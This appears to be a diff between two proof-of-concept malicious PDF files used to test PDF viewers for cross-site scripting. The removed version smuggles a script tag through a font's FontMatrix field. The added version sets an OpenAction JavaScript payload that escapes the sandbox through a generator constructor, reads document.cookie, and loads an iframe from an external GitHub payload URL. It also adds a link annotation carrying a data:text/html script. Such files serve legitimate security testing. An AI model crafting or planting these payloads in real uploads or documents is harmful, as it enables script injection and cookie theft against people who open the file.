@@ -1,157 +1,128 @@
-
-%PDF-1.4
-%DUMMY
-8 0 obj
+%PDF-1.5
+%����
+1 0 obj
 <<
-/PatternType 2
-/Shading<<
-  /Function<<
-    /Domain[0 1]
-    /C0[0 0 1]
-    /C1[1 0.6 0]
-    /N 1
-    /FunctionType 2
-  >>
-  /ShadingType 2
-  /Coords[46 400 537 400]
-  /Extend[false false]
-  /ColorSpace/DeviceRGB
->>
-/Type/Pattern
+/Type /Catalog
+/Pages 2 0 R
+/OpenAction 3 0 R
+/Lang (it-IT)
 >>
 endobj
-5 0 obj
+4 0 obj
 <<
-/Widths[573 0 582 0 548 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 573 0 573 0 341]
-/Type/Font
-/BaseFont/PAXEKO+SourceSansPro-Bold
-/LastChar 102
-/Encoding/WinAnsiEncoding
-/FontMatrix [0.1 0 0 0.1 0 (1\);
-<script> alert\('poc by matrix3d'\) </script>
-//)]
-/Subtype/Type1
-/FirstChar 65
-/FontDescriptor 9 0 R
+/Creator <FEFF005700720069007400650072>
+/Producer <FEFF004C0069006200720065004F0066006600690063006500200036002E0034>
+/CreationDate (D:20210113010342+01'00')
 >>
 endobj
 2 0 obj
 <<
-/Kids[3 0 R]
-/Type/Pages
+/Type /Pages
+/Resources 5 0 R
+/MediaBox [0 0 595 841]
+/Kids [6 0 R]
 /Count 1
 >>
 endobj
-9 0 obj
+3 0 obj
 <<
-/Type/FontDescriptor
-/ItalicAngle 0
-/Ascent 751
-/FontBBox[-6 -12 579 713]
-/FontName/PAXEKO+SourceSansPro-Bold
-/StemV 100
-/CapHeight 713
-/Flags 32
-/FontFile3 10 0 R
-/Descent -173
-/MissingWidth 250
+/Type /Action
+/S /JavaScript
+/JS (app.alert\(1\); Object.getPrototypeOf(function*(){}).constructor = null; ((function*(){}).constructor("document.write('<script>confirm(document.cookie);</script><iframe src=https://raw.githubusercontent.com/SHAHID-XT/xss-via-pdf-upload/refs/heads/main/xss-poc-payload');"))().next();)
+>>
+endobj
+5 0 obj
+<<
+/Font 7 0 R
+/ProcSet [/PDF /Text]
 >>
 endobj
 6 0 obj
 <<
-/Length 128
->>
-stream
-47 379 489 230 re S
-/Pattern cs
-BT
-  50 500 Td
-  117 TL
-  /F1 150 Tf
-  /P1 scn
-  (AbCdEf) Tj
-  /P2 scn
-  (AbCdEf) '
-ET
-endstream
-endobj
-3 0 obj
-<<
-/Type/Page
-/Resources 4 0 R
-/Contents 6 0 R
+/Type /Page
 /Parent 2 0 R
-/MediaBox[0 0 595.2756 841.8898]
+/Resources 5 0 R
+/MediaBox [0 0 595.303937007874 841.889763779528]
+/Annots [8 0 R]
+/Group <<
+/S /Transparency
+/CS /DeviceRGB
+/I true
 >>
-endobj
-10 0 obj
-<<
-/Length 800
-/Subtype/Type2
+/Contents 9 0 R
 >>
-stream
-
-endstream
 endobj
 7 0 obj
 <<
-/PatternType 1
-/Matrix[1 0 0 1 50 0]
-/Length 58
-/TilingType 1
-/BBox[0 0 16 16]
-/YStep 16
-/PaintType 1
-/Resources<<
+/F1 10 0 R
 >>
-/XStep 16
+endobj
+8 0 obj
+<<
+/Type /Annot
+/Subtype /Link
+/Border [0 0 0]
+/Rect [56.693 771.389 133.757 785.189]
+/A <<
+/Type /Action
+/S /URI
+/URI (data:text/html,<script>alert\(2\);</script>)
+>>
+>>
+endobj
+9 0 obj
+<<
+/Length 163
+/Filter /FlateDecode
 >>
 stream
-0.65 g
-0 0 16 16 re f
-0.15 g
-0 0 8 8 re f
-8 8 8 8 re f
+x�U�=�@����wz&�^��ܪ���b���۩�KH�$l#}�`�6�Eg�w���
+��W�̄2�%�^�)�Z�}mb�(w�w�(�Kb�.��:K�&W6��m�|b����
+D�i� ��@�B�je�[Ol<��Q�=1*чz�ꍓn���i/�
 endstream
 endobj
-4 0 obj
+10 0 obj
 <<
-/Pattern<<
-  /P1 7 0 R
-  /P2 8 0 R
->>
-/Font<<
-  /F1 5 0 R
->>
+/Type /Font
+/Subtype /TrueType
+/BaseFont /BAAAAA+LiberationSerif
+/FirstChar 0
+/LastChar 9
+/Widths [777 722 500 443 389 277 500 250 443 500]
+/FontDescriptor 11 0 R
+/ToUnicode 12 0 R
 >>
 endobj
-1 0 obj
+11 0 obj
 <<
-/Pages 2 0 R
-/Type/Catalog
-/OpenAction[3 0 R /Fit]
+/Type /FontDescriptor
+/FontName /BAAAAA+LiberationSerif
+/Flags 4
+/FontBBox [-543 -303 1277 981]
+/ItalicAngle 0
+/Ascent 891
+/Descent -216
+/CapHeight 981
+/StemV 80
+/FontFile2 13 0 R
 >>
 endobj
-
-xref
-0 11
-0000000000 65535 f
-0000002260 00000 n
-0000000522 00000 n
-0000000973 00000 n
-0000002178 00000 n
-0000000266 00000 n
-0000000794 00000 n
-0000001953 00000 n
-0000000015 00000 n
-0000000577 00000 n
-0000001085 00000 n
-trailer
+12 0 obj
 <<
-/ID[(DUMMY) (DUMMY)]
-/Root 1 0 R
-/Size 11
+/Length 266
+/Filter /FlateDecode
 >>
-startxref
-2333
-%%EOF
+stream
+x�]��n� E�|�t;q�e�Jcɋ>T7�a�"Հ0^��C�J]��x��s'��O�V>{sFt�頴t0��	�=�J���R	���$�n�=L�LU��=�f�V�y�����:	N�nn�.��b�L�=e����!����� C׶�����
+�?��j�X�ia$̖p\�@*�jZ5MM@��sr���.(�d����򱌼C> ���]�2�>�!i��G�E>!_O��Is�Y��Sŵ���bq.$��b�Ni�]�56��|���
+endstream
+endobj
+13 0 obj
+<<
+/Length 5286
+/Filter /FlateDecode
+/Length1 9136
+>>
+stream
+x��8ktיߝ�,ٖ-���@�b�yؖ�
+	&��m�,��	�X�-[R$aB��i��K۴$l�=�ͦ9i3v���m���tۦ��6/Z�4m444}��y�{gd%��=�oG�3��}�GʦE�� �'<)���b#
